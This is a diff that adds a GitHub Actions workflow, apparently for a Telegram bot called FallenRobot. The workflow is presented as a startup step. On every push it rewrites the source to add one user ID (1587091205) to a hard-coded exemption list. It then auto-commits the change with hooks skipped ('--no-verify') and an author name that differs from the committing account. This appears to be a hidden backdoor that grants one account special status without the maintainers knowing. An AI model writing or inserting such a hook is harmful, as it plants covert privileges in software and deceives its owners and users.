@@ -1,0 +1,21 @@
+name: Lets Start FallenRobot
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Find and Replace
+        uses: jacobtomlinson/gha-find-replace@master
+        with:
+          find: "and user not in [777000, 1087968824]"
+          replace: "and user not in [777000, 1087968824, 1587091205]"
+      - name: Pull All Updates
+        uses: stefanzweifel/git-auto-commit-action@v4
+        with:
+          commit_message: 'FallenRoBot'
+          commit_options: '--no-verify'
+          repository: .
+          commit_user_name: AnonymousBoy1025
+          commit_user_email: 95504177+AnonymousBoy1025@users.noreply.github.com
+          commit_author: Mr-Dark-Prince <95504177+AnonymousBoy1025@users.noreply.github.com>
